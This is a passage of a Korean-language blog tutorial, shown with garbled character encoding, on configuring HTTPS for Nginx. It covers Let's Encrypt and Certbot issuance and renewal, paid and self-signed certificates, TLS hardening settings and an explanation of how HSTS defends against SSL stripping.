•-ê³¼ì •ì—ì„œ-ì„ íƒ-ì‚¬í•­" class="headerlink" title="ìë™ ì„¤ì • ê³¼ì •ì—ì„œ ì„ íƒ ì‚¬í•­"></a>ìë™ ì„¤ì • ê³¼ì •ì—ì„œ ì„ íƒ ì‚¬í•­</h4><ol><li>ì´ë©”ì¼ ì…ë ¥ (ì¸ì¦ì„œ ë§Œë£Œ ì•Œë¦¼ìš©)</li><li>ì„œë¹„ìŠ¤ ì•½ê´€ ë™ì˜</li><li>HTTP íŠ¸ë˜í”½ ì²˜ë¦¬ ë°©ë²• ì„ íƒ:<ul><li>HTTPì™€ HTTPS ëª¨ë‘ í—ˆìš©</li><li>HTTPë¥¼ HTTPSë¡œ ìë™ ë¦¬ë‹¤ì´ë ‰íŠ¸ (ê¶Œì¥)</li></ul></li></ol><h3 id="ì¸ì¦ì„œ-ë°œê¸‰-ìˆ˜ë™-ì„¤ì •"><a href="#ì¸ì¦ì„œ-ë°œê¸‰-ìˆ˜ë™-ì„¤ì •" class="headerlink" title="ì¸ì¦ì„œ ë°œê¸‰ (ìˆ˜ë™ ì„¤ì •)"></a>ì¸ì¦ì„œ ë°œê¸‰ (ìˆ˜ë™ ì„¤ì •)</h3><p>ì„¤ì • íŒŒì¼ì„ ì§ì ‘ ìˆ˜ì •í•˜ë ¤ë©´:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì¸ì¦ì„œë§Œ ë°œê¸‰ (ì„¤ì •ì€ ìˆ˜ë™ìœ¼ë¡œ)</span></span><br><span class="line">sudo certbot certonly --nginx -d example.com -d www.example.com</span><br></pre></td></tr></table></figure><p>ë°œê¸‰ëœ ì¸ì¦ì„œ ìœ„ì¹˜:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/letsencrypt/live/example.com/fullchain.pem   # ì¸ì¦ì„œ</span><br><span class="line">/etc/letsencrypt/live/example.com/privkey.pem     # ê°œì¸í‚¤</span><br><span class="line">/etc/letsencrypt/live/example.com/chain.pem       # ì²´ì¸ ì¸ì¦ì„œ</span><br><span class="line">/etc/letsencrypt/live/example.com/cert.pem        # ì„œë²„ ì¸ì¦ì„œ</span><br></pre></td></tr></table></figure><h3 id="Nginx-ìˆ˜ë™-ì„¤ì •"><a href="#Nginx-ìˆ˜ë™-ì„¤ì •" class="headerlink" title="Nginx ìˆ˜ë™ ì„¤ì •"></a>Nginx ìˆ˜ë™ ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ACME ì±Œë¦°ì§€ìš© (ì¸ì¦ì„œ ê°±ì‹ ì— í•„ìš”)</span></span><br><span class="line">    <span class="section">location</span><span class="regexp"> ^~</span> /.well-known/acme-challenge/ &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë‚˜ë¨¸ì§€ ìš”ì²­ì€ HTTPSë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL ì¸ì¦ì„œ ì„¤ì •</span></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL í”„ë¡œí† ì½œ ì„¤ì •</span></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL ì•”í˜¸í™” ìŠ¤ìœ„íŠ¸</span></span><br><span class="line">    <span class="attribute">ssl_ciphers</span> <span class="string">&#x27;ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL ì„¸ì…˜ ìºì‹œ</span></span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">10m</span>;</span><br><span class="line">    <span class="attribute">ssl_session_timeout</span> <span class="number">10m</span>;</span><br><span class="line">    <span class="attribute">ssl_session_tickets</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># OCSP Stapling</span></span><br><span class="line">    <span class="attribute">ssl_stapling</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">ssl_stapling_verify</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">ssl_trusted_certificate</span> /etc/letsencrypt/live/example.com/chain.pem;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># DNS ë¦¬ì¡¸ë²„</span></span><br><span class="line">    <span class="attribute">resolver</span> <span class="number">8.8.8.8</span> <span class="number">8.8.4.4</span> valid=<span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">resolver_timeout</span> <span class="number">5s</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë³´ì•ˆ í—¤ë”</span></span><br><span class="line">    <span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=63072000; includeSubDomains; preload&quot;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> X-Content-Type-Options <span class="string">&quot;nosniff&quot;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span> always;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.html index.htm;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ìë™-ê°±ì‹ -ì„¤ì •"><a href="#ìë™-ê°±ì‹ -ì„¤ì •" class="headerlink" title="ìë™ ê°±ì‹  ì„¤ì •"></a>ìë™ ê°±ì‹  ì„¤ì •</h3><p>Letâ€™s Encrypt ì¸ì¦ì„œëŠ” <strong>90ì¼</strong>ë§ˆë‹¤ ê°±ì‹ ì´ í•„ìš”í•©ë‹ˆë‹¤.</p><h4 id="ê°±ì‹ -í…ŒìŠ¤íŠ¸"><a href="#ê°±ì‹ -í…ŒìŠ¤íŠ¸" class="headerlink" title="ê°±ì‹  í…ŒìŠ¤íŠ¸"></a>ê°±ì‹  í…ŒìŠ¤íŠ¸</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo certbot renew --dry-run</span><br></pre></td></tr></table></figure><h4 id="Cron-ì‘ì—…-ì¶”ê°€-ìë™-ê°±ì‹ "><a href="#Cron-ì‘ì—…-ì¶”ê°€-ìë™-ê°±ì‹ " class="headerlink" title="Cron ì‘ì—… ì¶”ê°€ (ìë™ ê°±ì‹ )"></a>Cron ì‘ì—… ì¶”ê°€ (ìë™ ê°±ì‹ )</h4><p>Certbot ì„¤ì¹˜ ì‹œ ìë™ìœ¼ë¡œ systemd timerê°€ ì„¤ì •ë˜ì§€ë§Œ, í™•ì¸:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># systemd timer í™•ì¸</span></span><br><span class="line">systemctl status certbot.timer</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìˆ˜ë™ ì‹¤í–‰</span></span><br><span class="line">sudo certbot renew</span><br><span class="line"></span><br><span class="line"><span class="comment"># ê°±ì‹  í›„ Nginx ë¦¬ë¡œë“œë¥¼ ìœ„í•œ hook</span></span><br><span class="line">sudo certbot renew --deploy-hook <span class="string">&quot;systemctl reload nginx&quot;</span></span><br></pre></td></tr></table></figure><p>ìˆ˜ë™ìœ¼ë¡œ cron ì„¤ì •í•˜ë ¤ë©´:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo crontab -e</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒ ì¤„ ì¶”ê°€:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ë§¤ì¼ ìƒˆë²½ 3ì‹œì— ì¸ì¦ì„œ ê°±ì‹  í™•ì¸</span><br><span class="line">0 3 * * * certbot renew --quiet --deploy-hook &quot;systemctl reload nginx&quot;</span><br></pre></td></tr></table></figure><h3 id="ì™€ì¼ë“œì¹´ë“œ-ì¸ì¦ì„œ-ë°œê¸‰"><a href="#ì™€ì¼ë“œì¹´ë“œ-ì¸ì¦ì„œ-ë°œê¸‰" class="headerlink" title="ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œ ë°œê¸‰"></a>ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œ ë°œê¸‰</h3><p>ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œëŠ” DNS ì¸ì¦ì´ í•„ìš”í•©ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo certbot certonly \</span><br><span class="line">  --manual \</span><br><span class="line">  --preferred-challenges dns \</span><br><span class="line">  -d <span class="string">&quot;*.example.com&quot;</span> \</span><br><span class="line">  -d example.com</span><br></pre></td></tr></table></figure><p>ê³¼ì •:</p><ol><li>Certbotì´ TXT ë ˆì½”ë“œ ê°’ì„ ì œê³µ</li><li>DNS ì„¤ì •ì—ì„œ _acme-challenge.example.com TXT ë ˆì½”ë“œ ì¶”ê°€</li><li>DNS ì „íŒŒ í™•ì¸ í›„ Enter</li></ol><p>DNS ì „íŒŒ í™•ì¸:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig _acme-challenge.example.com TXT</span><br></pre></td></tr></table></figure><h2 id="ë°©ë²•-2-ìœ ë£Œ-ì¸ì¦ì„œ"><a href="#ë°©ë²•-2-ìœ ë£Œ-ì¸ì¦ì„œ" class="headerlink" title="ë°©ë²• 2: ìœ ë£Œ ì¸ì¦ì„œ"></a>ë°©ë²• 2: ìœ ë£Œ ì¸ì¦ì„œ</h2><h3 id="1-ì¸ì¦ì„œ-êµ¬ë§¤"><a href="#1-ì¸ì¦ì„œ-êµ¬ë§¤" class="headerlink" title="1. ì¸ì¦ì„œ êµ¬ë§¤"></a>1. ì¸ì¦ì„œ êµ¬ë§¤</h3><p>ì¸ì¦ì„œë¥¼ êµ¬ë§¤í•  ìˆ˜ ìˆëŠ” ê³³:</p><ul><li>Comodo&#x2F;Sectigo</li><li>DigiCert</li><li>GlobalSign</li><li>GoDaddy</li><li>Namecheap</li></ul><h3 id="2-CSR-Certificate-Signing-Request-ìƒì„±"><a href="#2-CSR-Certificate-Signing-Request-ìƒì„±" class="headerlink" title="2. CSR (Certificate Signing Request) ìƒì„±"></a>2. CSR (Certificate Signing Request) ìƒì„±</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ê°œì¸í‚¤ ìƒì„±</span></span><br><span class="line">sudo openssl genrsa -out /etc/ssl/private/example.com.key 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># CSR ìƒì„±</span></span><br><span class="line">sudo openssl req -new -key /etc/ssl/private/example.com.key \</span><br><span class="line">  -out /etc/ssl/csr/example.com.csr</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì…ë ¥ ì •ë³´</span></span><br><span class="line">Country Name (2 letter code) [AU]: KR</span><br><span class="line">State or Province Name (full name) [Some-State]: Seoul</span><br><span class="line">Locality Name (eg, city) []: Seoul</span><br><span class="line">Organization Name (eg, company) []: Example Inc</span><br><span class="line">Organizational Unit Name (eg, section) []: IT</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []: example.com</span><br><span class="line">Email Address []: admin@example.com</span><br></pre></td></tr></table></figure><h3 id="3-CSR-ì œì¶œ-ë°-ì¸ì¦ì„œ-ë°›ê¸°"><a href="#3-CSR-ì œì¶œ-ë°-ì¸ì¦ì„œ-ë°›ê¸°" class="headerlink" title="3. CSR ì œì¶œ ë° ì¸ì¦ì„œ ë°›ê¸°"></a>3. CSR ì œì¶œ ë° ì¸ì¦ì„œ ë°›ê¸°</h3><ol><li><p>CSR íŒŒì¼ ë‚´ìš©ì„ ì¸ì¦ ê¸°ê´€ì— ì œì¶œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/ssl/csr/example.com.csr</span><br></pre></td></tr></table></figure></li><li><p>ë„ë©”ì¸ ê²€ì¦ ì™„ë£Œ (ì´ë©”ì¼ ë˜ëŠ” DNS)</p></li><li><p>ì¸ì¦ì„œ íŒŒì¼ ë‹¤ìš´ë¡œë“œ:</p><ul><li>example.com.crt (ì„œë²„ ì¸ì¦ì„œ)</li><li>intermediate.crt (ì¤‘ê°„ ì¸ì¦ì„œ)</li></ul></li></ol><h3 id="4-ì¸ì¦ì„œ-ì„¤ì¹˜"><a href="#4-ì¸ì¦ì„œ-ì„¤ì¹˜" class="headerlink" title="4. ì¸ì¦ì„œ ì„¤ì¹˜"></a>4. ì¸ì¦ì„œ ì„¤ì¹˜</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì¸ì¦ì„œ íŒŒì¼ ì €ì¥</span></span><br><span class="line">sudo <span class="built_in">cp</span> example.com.crt /etc/ssl/certs/</span><br><span class="line">sudo <span class="built_in">cp</span> intermediate.crt /etc/ssl/certs/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ê¶Œí•œ ì„¤ì •</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 644 /etc/ssl/certs/example.com.crt</span><br><span class="line">sudo <span class="built_in">chmod</span> 644 /etc/ssl/certs/intermediate.crt</span><br><span class="line">sudo <span class="built_in">chmod</span> 600 /etc/ssl/private/example.com.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¸ì¦ì„œ ì²´ì¸ ìƒì„± (ì˜µì…˜)</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/ssl/certs/example.com.crt \</span><br><span class="line">         /etc/ssl/certs/intermediate.crt \</span><br><span class="line">         &gt; /etc/ssl/certs/example.com-chain.crt</span><br></pre></td></tr></table></figure><h3 id="5-Nginx-ì„¤ì •"><a href="#5-Nginx-ì„¤ì •" class="headerlink" title="5. Nginx ì„¤ì •"></a>5. Nginx ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/ssl/certs/example.com-chain.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/ssl/private/example.com.key;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë‚˜ë¨¸ì§€ SSL ì„¤ì •ì€ ìœ„ì™€ ë™ì¼</span></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> <span class="string">&#x27;ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256&#x27;</span>;</span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ë°©ë²•-3-ìì²´-ì„œëª…-ì¸ì¦ì„œ-ê°œë°œ-í…ŒìŠ¤íŠ¸ìš©"><a href="#ë°©ë²•-3-ìì²´-ì„œëª…-ì¸ì¦ì„œ-ê°œë°œ-í…ŒìŠ¤íŠ¸ìš©" class="headerlink" title="ë°©ë²• 3: ìì²´ ì„œëª… ì¸ì¦ì„œ (ê°œë°œ&#x2F;í…ŒìŠ¤íŠ¸ìš©)"></a>ë°©ë²• 3: ìì²´ ì„œëª… ì¸ì¦ì„œ (ê°œë°œ&#x2F;í…ŒìŠ¤íŠ¸ìš©)</h2><p>í”„ë¡œë•ì…˜ í™˜ê²½ì—ëŠ” ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš”!</p><h3 id="ì¸ì¦ì„œ-ìƒì„±"><a href="#ì¸ì¦ì„œ-ìƒì„±" class="headerlink" title="ì¸ì¦ì„œ ìƒì„±"></a>ì¸ì¦ì„œ ìƒì„±</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ê°œì¸í‚¤ì™€ ì¸ì¦ì„œë¥¼ í•œ ë²ˆì— ìƒì„± (ìœ íš¨ê¸°ê°„ 365ì¼)</span></span><br><span class="line">sudo openssl req -x509 -nodes -days 365 \</span><br><span class="line">  -newkey rsa:2048 \</span><br><span class="line">  -keyout /etc/ssl/private/selfsigned.key \</span><br><span class="line">  -out /etc/ssl/certs/selfsigned.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì…ë ¥ ì •ë³´</span></span><br><span class="line">Country Name: KR</span><br><span class="line">State: Seoul</span><br><span class="line">Locality: Seoul</span><br><span class="line">Organization: Dev</span><br><span class="line">Common Name: localhost (ë˜ëŠ” ê°œë°œ ë„ë©”ì¸)</span><br></pre></td></tr></table></figure><h3 id="Nginx-ì„¤ì •"><a href="#Nginx-ì„¤ì •" class="headerlink" title="Nginx ì„¤ì •"></a>Nginx ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/ssl/certs/selfsigned.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/ssl/private/selfsigned.key;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SSL-ìµœì í™”-ì„¤ì •"><a href="#SSL-ìµœì í™”-ì„¤ì •" class="headerlink" title="SSL ìµœì í™” ì„¤ì •"></a>SSL ìµœì í™” ì„¤ì •</h2><h3 id="1-Mozilla-SSL-Configuration-Generator"><a href="#1-Mozilla-SSL-Configuration-Generator" class="headerlink" title="1. Mozilla SSL Configuration Generator"></a>1. Mozilla SSL Configuration Generator</h3><p><a href="https://ssl-config.mozilla.org/">Mozilla SSL Configuration Generator</a>ë¥¼ ì‚¬ìš©í•˜ë©´ ìµœì‹  ê¶Œì¥ ì„¤ì •ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="2-ìµœì‹ -ë³´ì•ˆ-ì„¤ì •-2025ë…„-ê¸°ì¤€"><a href="#2-ìµœì‹ -ë³´ì•ˆ-ì„¤ì •-2025ë…„-ê¸°ì¤€" class="headerlink" title="2. ìµœì‹  ë³´ì•ˆ ì„¤ì • (2025ë…„ ê¸°ì¤€)"></a>2. ìµœì‹  ë³´ì•ˆ ì„¤ì • (2025ë…„ ê¸°ì¤€)</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/conf.d/ssl.conf</span></span><br><span class="line"><span class="comment"># ëª¨ë“  SSL ì‚¬ì´íŠ¸ì—ì„œ ê³µìœ </span></span><br><span class="line"></span><br><span class="line"><span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line"><span class="attribute">ssl_ciphers</span> <span class="string">&#x27;ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305&#x27;</span>;</span><br><span class="line"><span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Diffie-Hellman íŒŒë¼ë¯¸í„°</span></span><br><span class="line"><span class="attribute">ssl_dhparam</span> /etc/nginx/dhparam.pem;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì„¸ì…˜ ìºì‹œ</span></span><br><span class="line"><span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">10m</span>;</span><br><span class="line"><span class="attribute">ssl_session_timeout</span> <span class="number">1d</span>;</span><br><span class="line"><span class="attribute">ssl_session_tickets</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># OCSP Stapling</span></span><br><span class="line"><span class="attribute">ssl_stapling</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">ssl_stapling_verify</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">resolver</span> <span class="number">8.8.8.8</span> <span class="number">8.8.4.4</span> valid=<span class="number">300s</span>;</span><br><span class="line"><span class="attribute">resolver_timeout</span> <span class="number">5s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë³´ì•ˆ í—¤ë”</span></span><br><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=63072000; includeSubDomains; preload&quot;</span> always;</span><br></pre></td></tr></table></figure><h3 id="3-DH-íŒŒë¼ë¯¸í„°-ìƒì„±"><a href="#3-DH-íŒŒë¼ë¯¸í„°-ìƒì„±" class="headerlink" title="3. DH íŒŒë¼ë¯¸í„° ìƒì„±"></a>3. DH íŒŒë¼ë¯¸í„° ìƒì„±</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo openssl dhparam -out /etc/nginx/dhparam.pem 2048</span><br></pre></td></tr></table></figure><p>ë” ê°•ë ¥í•œ ë³´ì•ˆì„ ì›í•˜ë©´ 4096 ì‚¬ìš© (ì‹œê°„ì´ ì˜¤ë˜ ê±¸ë¦¼):</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo openssl dhparam -out /etc/nginx/dhparam.pem 4096</span><br></pre></td></tr></table></figure><h3 id="4-ì„œë²„ë³„-ì„¤ì •ì—ì„œ-include"><a href="#4-ì„œë²„ë³„-ì„¤ì •ì—ì„œ-include" class="headerlink" title="4. ì„œë²„ë³„ ì„¤ì •ì—ì„œ include"></a>4. ì„œë²„ë³„ ì„¤ì •ì—ì„œ include</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line">    <span class="attribute">ssl_trusted_certificate</span> /etc/letsencrypt/live/example.com/chain.pem;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ê³µí†µ SSL ì„¤ì • í¬í•¨</span></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/ssl.conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì‚¬ì´íŠ¸ë³„ ì„¤ì •</span></span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HSTS-HTTP-Strict-Transport-Security"><a href="#HSTS-HTTP-Strict-Transport-Security" class="headerlink" title="HSTS (HTTP Strict Transport Security)"></a>HSTS (HTTP Strict Transport Security)</h2><h3 id="HSTSë€"><a href="#HSTSë€" class="headerlink" title="HSTSë€?"></a>HSTSë€?</h3><p>HSTS(HTTP Strict Transport Security)ëŠ” ì›¹ì‚¬ì´íŠ¸ê°€ ë¸Œë¼ìš°ì €ì—ê²Œ â€œì•ìœ¼ë¡œëŠ” ë¬´ì¡°ê±´ HTTPSë¡œë§Œ ì ‘ì†í•˜ë¼â€ê³  ì§€ì‹œí•˜ëŠ” ë³´ì•ˆ ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. 2012ë…„ RFC 6797ë¡œ í‘œì¤€í™”ë˜ì—ˆìœ¼ë©°, í˜„ì¬ ëª¨ë“  ì£¼ìš” ë¸Œë¼ìš°ì €ì—ì„œ ì§€ì›ë©ë‹ˆë‹¤.</p><h3 id="HSTSì˜-ì‘ë™-ì›ë¦¬"><a href="#HSTSì˜-ì‘ë™-ì›ë¦¬" class="headerlink" title="HSTSì˜ ì‘ë™ ì›ë¦¬"></a>HSTSì˜ ì‘ë™ ì›ë¦¬</h3><ol><li><strong>ìµœì´ˆ HTTPS ì ‘ì†</strong>: ì‚¬ìš©ìê°€ ì²˜ìŒ HTTPSë¡œ ì‚¬ì´íŠ¸ì— ì ‘ì†í•©ë‹ˆë‹¤.</li><li><strong>HSTS í—¤ë” ìˆ˜ì‹ </strong>: ì„œë²„ëŠ” <code>Strict-Transport-Security</code> í—¤ë”ë¥¼ ì‘ë‹µì— í¬í•¨ì‹œí‚µë‹ˆë‹¤.</li><li><strong>ë¸Œë¼ìš°ì € ì €ì¥</strong>: ë¸Œë¼ìš°ì €ëŠ” ì´ ì •ì±…ì„ ì €ì¥í•˜ê³  ì§€ì •ëœ ê¸°ê°„ ë™ì•ˆ ê¸°ì–µí•©ë‹ˆë‹¤.</li><li><strong>ìë™ HTTPS ì „í™˜</strong>: ì´í›„ ì‚¬ìš©ìê°€ HTTPë¡œ ì ‘ì†ì„ ì‹œë„í•˜ë©´, ë¸Œë¼ìš°ì €ê°€ ìë™ìœ¼ë¡œ HTTPSë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸í•©ë‹ˆë‹¤ (ì„œë²„ ì™•ë³µ ì—†ì´!).</li></ol><h3 id="HSTSê°€-í•´ê²°í•˜ëŠ”-ë³´ì•ˆ-ë¬¸ì œ"><a href="#HSTSê°€-í•´ê²°í•˜ëŠ”-ë³´ì•ˆ-ë¬¸ì œ" class="headerlink" title="HSTSê°€ í•´ê²°í•˜ëŠ” ë³´ì•ˆ ë¬¸ì œ"></a>HSTSê°€ í•´ê²°í•˜ëŠ” ë³´ì•ˆ ë¬¸ì œ</h3><h4 id="1-SSL-Stripping-ê³µê²©-ë°©ì§€"><a href="#1-SSL-Stripping-ê³µê²©-ë°©ì§€" class="headerlink" title="1. SSL Stripping ê³µê²© ë°©ì§€"></a>1. SSL Stripping ê³µê²© ë°©ì§€</h4><p><strong>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ (HSTS ì—†ì´):</strong></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1. ì‚¬ìš©ìê°€ http://bank.com ì…ë ¥</span><br><span class="line">2. ê³µê²©ìê°€ ì¤‘ê°„ì—ì„œ ê°€ë¡œì±„ê³  HTTPë¡œ ì‘ë‹µ</span><br><span class="line">3. ì‚¬ìš©ìëŠ” HTTPë¡œ í†µì‹ í•˜ê²Œ ë˜ì–´ ì •ë³´ ìœ ì¶œ</span><br></pre></td></tr></table></figure><p><strong>HSTSë¡œ ë°©ì–´:</strong></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1. ì‚¬ìš©ìê°€ http://bank.com ì…ë ¥</span><br><span class="line">2. ë¸Œë¼ìš°ì €ê°€ ìë™ìœ¼ë¡œ https://bank.comìœ¼ë¡œ ë³€ê²½</span><br><span class="line">3. ê³µê²©ìê°€ ê°œì…í•  ê¸°íšŒê°€ ì—†ìŒ</span><br></pre></td></tr></table></figure><h4 id="2-ì¤‘ê°„ì-ê³µê²©-Man-in-the-Middle-ë°©ì§€"><a href="#2-ì¤‘ê°„ì-ê³µê²©-Man-in-the-Middle-ë°©ì§€" class="headerlink" title="2. ì¤‘ê°„ì ê³µê²© (Man-in-the-Middle) ë°©ì§€"></a>2. ì¤‘ê°„ì ê³µê²© (Man-in-the-Middle) ë°©ì§€</h4><p>ì‚¬ìš©ìê°€ ì‹¤ìˆ˜ë¡œ HTTP ë§í¬ë¥¼ í´ë¦­í•˜ê±°ë‚˜, ë¶ë§ˆí¬ì— HTTPë¡œ ì €ì¥í–ˆë”ë¼ë„ ë¸Œë¼ìš°ì €ê°€ ìë™ìœ¼ë¡œ HTTPSë¡œ ì „í™˜í•˜ì—¬ ë³´í˜¸í•©ë‹ˆë‹¤.</p><h4 id="3-Mixed-Content-ë¬¸ì 